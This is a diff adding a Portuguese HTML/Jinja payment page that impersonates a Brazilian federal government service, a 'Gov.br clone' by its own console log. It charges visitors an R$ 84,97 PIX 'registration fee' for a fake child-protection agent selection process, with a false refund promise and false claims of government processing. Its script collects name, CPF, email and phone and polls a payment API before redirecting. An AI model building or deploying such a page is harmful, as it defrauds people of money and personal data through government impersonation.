@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ page_title or "Guia de Recolhimento da União - Agentes de Apoio ao Conselho Tutelar" }}</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700&display=swap" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet"/>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <style>
+        body {
+            font-family: 'Montserrat', Arial, sans-serif;
+        }
+        .inter {
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.5s ease-in;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .loading-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1e40af;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="bg-[#fafbfc]">
+    <!-- Header -->
+    <div class="w-full bg-white border-b border-[#e5e7eb]">
+        <div class="max-w-sm mx-auto flex items-center pl-1 pr-2 py-2">
+            <img alt="Logo do Governo Federal com texto Pátria Amada Brasil, horizontal, fundo branco" 
+                 class="h-10 w-auto mr-3" 
+                 src="https://sites.ufpe.br/especializacao/wp-content/uploads/sites/11/2019/12/logo-patria-amada-brasil-horizontal.png" 
+                 style="max-width: 150px;"/>
+            <div>
+                <div class="text-[#222] text-[15px] font-medium leading-tight">
+                    Guia de Recolhimento da União
+                </div>
+                <div class="text-[#444] text-[12px] leading-tight">
+                    Mais Proteção • Agentes de Apoio ao Conselho Tutelar
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="max-w-sm mx-auto px-2 pt-4 pb-6">
+        <div class="text-center">
+            <div id="nome-usuario" class="text-[#222] text-[18px] font-medium mb-1">
+                {% if nome_usuario %}{{ nome_usuario.split(' ')[0]|upper }}, finalize sua inscrição{% else %}Finalize sua inscrição{% endif %}
+            </div>
+            <div class="text-[#444] text-[14px] mb-4">
+                Última etapa para confirmar sua participação
+            </div>
+            <div class="text-[#888] text-[13px] mb-0.5">
+                Total para quitação
+            </div>
+            <div id="valor-pagamento" class="text-[#222] text-[36px] font-light mb-0.5 leading-none">
+                {% if valor %}R$ {{ "%.2f"|format(valor)|replace('.', ',') }}{% else %}R$ 84,97{% endif %}
+            </div>
+            <div class="text-[#888] text-[13px] mb-3">
+                Quitação com Segurança Garantida.
+            </div>
+            <div class="flex justify-center mb-4">
+                <div class="border-l-2 border-[#e5e7eb] pl-2 text-left">
+                    <div class="text-[#444] text-[12px] font-medium">
+                        Garantia de comparecimento
+                    </div>
+                    <div class="text-[#888] text-[12px]">
+                        Valor devolvido integralmente após sua presença na prova
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- QR Code Section -->
+        <div id="qr-section" class="flex justify-center mb-4">
+            <div class="bg-white rounded-xl shadow p-2">
+                {% if pix_pre_gerado and qr_code %}
+                <img id="qr-code-img" 
+                     alt="QR Code para pagamento PIX" 
+                     class="w-36 h-36 object-contain" 
+                     height="144" 
+                     width="144"
+                     src="https://api.qrserver.com/v1/create-qr-code/?size=144x144&data={{ qr_code|urlencode }}"/>
+                {% else %}
+                <img id="qr-code-img" 
+                     alt="QR Code para pagamento PIX, preto e branco, centralizado" 
+                     class="w-36 h-36 object-contain" 
+                     height="144" 
+                     width="144"
+                     src="https://replicate.delivery/xezq/no84nIWjepWwQiqGfvGLYLyrtZ3gYdqfeWsYkXc6WbPo4daUB/out-0.png"/>
+                {% endif %}
+            </div>
+        </div>
+
+        <!-- Payment Status -->
+        <div id="payment-status" class="mb-4 text-center">
+            {% if pix_pre_gerado %}
+            <div class="bg-green-50 border border-green-200 rounded-lg p-3">
+                <div class="text-green-800 text-[14px] font-medium mb-1">PIX pronto para pagamento</div>
+                <div class="text-green-600 text-[12px]">Escaneie o QR Code ou copie o código abaixo</div>
+            </div>
+            {% else %}
+            <div class="bg-blue-50 border border-blue-200 rounded-lg p-3">
+                <div class="text-blue-800 text-[14px] font-medium mb-1">Preparando pagamento...</div>
+                <div class="text-blue-600 text-[12px]">Aguarde enquanto geramos seu código PIX</div>
+            </div>
+            {% endif %}
+        </div>
+
+        <!-- PIX Code Section -->
+        <div id="pix-section">
+            <div class="text-[#222] text-[15px] font-medium mb-1">
+                Código PIX
+            </div>
+            <div class="bg-white rounded-lg border border-[#e5e7eb] p-3 mb-4">
+                <textarea id="pix-code" 
+                          class="w-full text-[#444] text-[12px] font-mono bg-transparent border-none resize-none outline-none break-words leading-tight" 
+                          rows="4" 
+                          readonly 
+                          placeholder="Carregando código PIX...">{% if pix_pre_gerado and pix_code %}{{ pix_code }}{% endif %}</textarea>
+            </div>
+            <button id="copy-button" 
+                    class="w-full bg-[#1857d3] hover:bg-[#174fc2] text-white text-[16px] font-medium rounded-lg py-3 flex items-center justify-center transition-colors duration-150"
+                    onclick="navigator.clipboard.writeText(document.getElementById('pix-code').value)">
+                <i class="far fa-copy mr-2 text-[15px]"></i>
+                Copiar código
+            </button>
+        </div>
+
+        <!-- Como quitar Section -->
+        <div class="inter mt-4">
+            <h1 class="text-[1rem] font-medium text-[#23272F] mb-3">Como quitar</h1>
+            <ol class="space-y-2 mb-4">
+                <li class="flex items-start">
+                    <span class="flex items-center justify-center w-6 h-6 rounded-full bg-[#F3F4F6] text-[#6B7280] font-medium text-[0.75rem] mr-3">1</span>
+                    <span class="text-[#444950] text-[0.9rem]">Abra seu aplicativo bancário</span>
+                </li>
+                <li class="flex items-start">
+                    <span class="flex items-center justify-center w-6 h-6 rounded-full bg-[#F3F4F6] text-[#6B7280] font-medium text-[0.75rem] mr-3">2</span>
+                    <span class="text-[#444950] text-[0.9rem]">Acesse a área PIX</span>
+                </li>
+                <li class="flex items-start">
+                    <span class="flex items-center justify-center w-6 h-6 rounded-full bg-[#F3F4F6] text-[#6B7280] font-medium text-[0.75rem] mr-3">3</span>
+                    <span class="text-[#444950] text-[0.9rem]">Escaneie o QR Code ou cole o código</span>
+                </li>
+                <li class="flex items-start">
+                    <span class="flex items-center justify-center w-6 h-6 rounded-full bg-[#F3F4F6] text-[#6B7280] font-medium text-[0.75rem] mr-3">4</span>
+                    <span class="text-[#444950] text-[0.9rem]">Confirme a quitação</span>
+                </li>
+            </ol>
+            
+
+            <div class="bg-[#F7F8FA] rounded-md px-3 py-3 mb-6">
+                <h2 class="text-[0.9rem] font-medium text-[#23272F] mb-1">Após a quitação</h2>
+                <p class="text-[#6B7280] text-[0.8rem] mb-2 leading-tight">
+                    Seu protocolo será finalizado automaticamente. Você receberá confirmação com todas as informações necessárias para acompanhar o processo seletivo:
+                </p>
+                <div class="text-[0.8rem]">
+                    <div class="mb-0.5">
+                        <span class="font-medium text-[#23272F]">Email:</span>
+                        <span id="email-confirmacao" class="text-[#444950]">{% if email_usuario %} {{ email_usuario }}{% else %} carregando...{% endif %}</span>
+                    </div>
+                    <div class="mb-0.5">
+                        <span class="font-medium text-[#23272F]">Telefone:</span>
+                        <span id="telefone-confirmacao" class="text-[#444950]">{% if telefone_usuario %} {{ telefone_usuario }}{% else %} carregando...{% endif %}</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="border-t border-[#E5E7EB] pt-4 pb-2 flex flex-col items-center">
+                <div class="flex items-center mb-1">
+                    <span class="text-[#A1A6B0] text-[0.8rem] mr-1">
+                        <i class="fas fa-shield-alt"></i>
+                    </span>
+                    <span class="text-[#A1A6B0] text-[0.8rem] font-medium">Quitação segura</span>
+                </div>
+                <div class="text-[#C2C6CE] text-[0.7rem] mb-4 text-center leading-tight">
+                    Processado via sistema governamental • SSL • Dados criptografados
+                </div>
+                <button id="continuar-btn" 
+                        class="w-full bg-[#F7F8FA] text-[#A1A6B0] text-[0.9rem] font-medium rounded-md py-3 cursor-default" 
+                        disabled>
+                    Continuar após quitação
+                </button>
+                
+                <!-- Debug button (only visible in development) -->
+                <button id="verify-payment-btn" 
+                        class="mt-2 w-full bg-green-600 text-white text-[0.9rem] font-medium rounded-md py-2 hover:bg-green-700 transition-colors" 
+                        style="display: none;">
+                    <i class="fas fa-check-circle mr-1"></i>
+                    Verificar Pagamento
+                </button>
+            </div>
+        </div>
+    </div>
+
+<script>
+// Variáveis globais
+let transacaoId = null;
+let verificacaoInterval = null;
+let dadosUsuario = {};
+
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('Mobile view activated');
+    console.log('Gov.br clone initialized');
+    console.log('Ready for service worker registration');
+    console.log('Page loaded in', performance.now() + 'ms');
+    
+    // Extrair dados da URL
+    const urlParams = new URLSearchParams(window.location.search);
+    dadosUsuario = {
+        nome: urlParams.get('nome') || 'Usuário',
+        cpf: urlParams.get('cpf') || '',
+        email: urlParams.get('email') || '',
+        telefone: urlParams.get('telefone') || '(11) 93849-3849',
+        tipo: urlParams.get('tipo') || 'inscricao',
+        valor: parseFloat(urlParams.get('valor')) || 84.97
+    };
+    
+    // Atualizar nome do usuário no título se não foi pré-definido pelo backend
+    const nomeUsuarioElement = document.getElementById('nome-usuario');
+    if (nomeUsuarioElement && dadosUsuario.nome && dadosUsuario.nome !== 'Usuário') {
+        const primeiroNome = dadosUsuario.nome.split(' ')[0].toUpperCase();
+        nomeUsuarioElement.textContent = `${primeiroNome}, finalize sua inscrição`;
+    }
+    
+    // Atualizar dados na seção "Após a quitação" se não foram pré-definidos
+    const emailElement = document.getElementById('email-confirmacao');
+    const telefoneElement = document.getElementById('telefone-confirmacao');
+    
+    if (emailElement && dadosUsuario.email && emailElement.textContent.includes('carregando')) {
+        emailElement.textContent = ` ${dadosUsuario.email}`;
+    }
+    
+    if (telefoneElement && dadosUsuario.telefone && telefoneElement.textContent.includes('carregando')) {
+        telefoneElement.textContent = ` ${dadosUsuario.telefone}`;
+    }
+    
+    // Configurar página baseado no tipo de pagamento (somente se não foi pré-configurado no backend)
+    {% if not pix_pre_gerado %}
+    configurarTipoPagamento(dadosUsuario.tipo, dadosUsuario.valor);
+    {% endif %}
+    
+    // Verificar se PIX já foi pré-gerado no backend
+    {% if pix_pre_gerado %}
+    {% if transacao_id %}
+    transacaoId = '{{ transacao_id }}';
+    {% endif %}
+    console.log('✅ PIX pré-gerado no backend - carregamento instantâneo!');
+    console.log('Transação ID:', transacaoId || 'não definido');
+    
+    // Ocultar status de preparação se PIX já está pronto
+    const statusElement = document.getElementById('payment-status');
+    if (statusElement && statusElement.classList.contains('bg-blue-50')) {
+        statusElement.style.display = 'none';
+    }
+    {% else %}
+    console.log('⚠️ PIX não pré-gerado, gerando via JavaScript...');
+    // Gerar PIX via JavaScript se não foi pré-gerado
+    if (dadosUsuario.nome && dadosUsuario.email) {
+        gerarPIX();
+    }
+    {% endif %}
+    
+    // Event listeners
+    document.getElementById('copy-button').addEventListener('click', function() {
+        copiarCodigo();
+    });
+    
+    document.getElementById('verify-payment-btn').addEventListener('click', function() {
+        verificarPagamento();
+    });
+    
+    // Verificar pagamento automaticamente a cada 5 segundos
+    setInterval(verificarPagamento, 5000);
+});
+
+function configurarTipoPagamento(tipo, valor) {
+    const valorElement = document.getElementById('valor-pagamento');
+    valorElement.textContent = `R$ ${valor.toFixed(2).replace('.', ',')}`;
+    
+    // Salvar tipo no localStorage
+    localStorage.setItem('tipoPagamentoAtual', tipo);
+}
+
+async function gerarPIX() {
+    try {
+        const dadosParaPIX = {
+            nome: dadosUsuario.nome,
+            cpf: dadosUsuario.cpf,
+            email: dadosUsuario.email,
+            telefone: dadosUsuario.telefone
+        };
+        
+        console.log('Dados para gerar PIX Iron Pay:', dadosParaPIX);
+        
+        const response = await fetch('/api/gerar-pix-iron-pay', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(dadosParaPIX)
+        });
+        
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        
+        const data = await response.json();
+        console.log('Resposta da API:', data);
+        
+        if (data.success) {
+            transacaoId = data.transacao_id;
+            localStorage.setItem('transacao_id', transacaoId);
+            
+            // Mostrar código PIX
+            document.getElementById('pix-code').value = data.pix_code;
+            
+            // Gerar QR code dinamicamente
+            if (data.qr_code) {
+                const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=144x144&data=${encodeURIComponent(data.qr_code)}`;
+                document.getElementById('qr-code-img').src = qrCodeUrl;
+            }
+            
+            // Ocultar status de preparação
+            document.getElementById('payment-status').style.display = 'none';
+            
+            // Verificação automática acontece nos bastidores
+            
+        } else {
+            mostrarErro(data.error || 'Erro ao gerar PIX');
+        }
+    } catch (error) {
+        console.error('Erro ao gerar PIX:', error);
+        mostrarErro('Erro de conexão ao gerar PIX. Detalhes: ' + error.message);
+        
+        // Mostrar botão de debug em caso de erro
+        document.getElementById('verify-payment-btn').style.display = 'block';
+    }
+}
+
+function copiarCodigo() {
+    const pixCode = document.getElementById('pix-code').value;
+    
+    if (!pixCode) {
+        alert('Código PIX não disponível');
+        return;
+    }
+    
+    navigator.clipboard.writeText(pixCode).then(() => {
+        const button = document.getElementById('copy-button');
+        const originalText = button.innerHTML;
+        
+        button.innerHTML = '<i class="fas fa-check mr-2 text-[13px]"></i>Código copiado!';
+        button.classList.remove('bg-[#1857d3]', 'hover:bg-[#174fc2]');
+        button.classList.add('bg-green-600', 'hover:bg-green-700');
+        
+        setTimeout(() => {
+            button.innerHTML = originalText;
+            button.classList.remove('bg-green-600', 'hover:bg-green-700');
+            button.classList.add('bg-[#1857d3]', 'hover:bg-[#174fc2]');
+        }, 2000);
+    }).catch(err => {
+        console.error('Erro ao copiar:', err);
+        alert('Erro ao copiar código. Tente selecionar e copiar manualmente.');
+    });
+}
+
+async function verificarPagamento() {
+    if (!transacaoId) {
+        console.log('ID da transação não disponível');
+        return;
+    }
+    
+    try {
+        const response = await fetch(`/api/verificar-pagamento/${transacaoId}`);
+        const data = await response.json();
+        
+        if (data.pago) {
+            console.log('🎉 Pagamento confirmado! Iniciando redirecionamento...');
+            
+            // Atualizar status visual
+            const statusElement = document.getElementById('payment-status');
+            if (statusElement) {
+                statusElement.innerHTML = `
+                    <div class="bg-green-50 border border-green-200 rounded-lg p-3">
+                        <div class="flex items-center">
+                            <i class="fas fa-check-circle text-green-600 mr-2"></i>
+                            <div>
+                                <div class="text-green-800 text-[12px] font-medium">Pagamento confirmado!</div>
+                                <div class="text-green-600 text-[10px]">Redirecionando...</div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }
+            
+            // Esconder verificação (se existir)
+            const verificacaoStatus = document.getElementById('verificacao-status');
+            if (verificacaoStatus) {
+                verificacaoStatus.style.display = 'none';
+            }
+            
+            // Habilitar botão continuar (se existir)
+            const continuarBtn = document.getElementById('continuar-btn');
+            if (continuarBtn) {
+                continuarBtn.disabled = false;
+                continuarBtn.classList.remove('bg-[#F7F8FA]', 'text-[#A1A6B0]', 'cursor-default');
+                continuarBtn.classList.add('bg-green-600', 'text-white', 'cursor-pointer');
+                continuarBtn.textContent = 'Continuar';
+            }
+            
+            // Salvar confirmação
+            try {
+                localStorage.setItem('pagamentoConfirmado', 'true');
+            } catch (e) {
+                console.warn('Erro ao salvar no localStorage:', e);
+            }
+            
+            // Redirecionar baseado no tipo
+            setTimeout(() => {
+                try {
+                    const tipoPagamento = dadosUsuario ? dadosUsuario.tipo : 'inscricao';
+                    console.log('Tipo de pagamento:', tipoPagamento);
+                    
+                    if (tipoPagamento === 'psicotecnico') {
+                        localStorage.setItem('pagamentoPsicotecnicoConfirmado', 'true');
+                        console.log('Redirecionando para confirmação de agendamento...');
+                        window.location.href = '/confirmacao-agendamento';
+                    } else {
+                        console.log('Redirecionando para registro SGTE...');
+                        window.location.href = '/registro-sgte';
+                    }
+                } catch (e) {
+                    console.error('Erro no redirecionamento:', e);
+                    // Fallback para inscrição
+                    window.location.href = '/registro-sgte';
+                }
+            }, 2000);
+            
+        } else {
+            // Ainda aguardando pagamento
+            console.log('Pagamento ainda pendente, status:', data.status);
+        }
+    } catch (error) {
+        console.error('Erro na verificação:', error);
+    }
+}
+
+function mostrarErro(mensagem) {
+    document.getElementById('payment-status').innerHTML = `
+        <div class="bg-red-50 border border-red-200 rounded-lg p-3">
+            <div class="flex items-center">
+                <i class="fas fa-exclamation-triangle text-red-600 mr-2"></i>
+                <div>
+                    <div class="text-red-800 text-[12px] font-medium">Erro</div>
+                    <div class="text-red-600 text-[10px]">${mensagem}</div>
+                </div>
+            </div>
+        </div>
+    `;
+}
+</script>
+
+</body>
+</html>
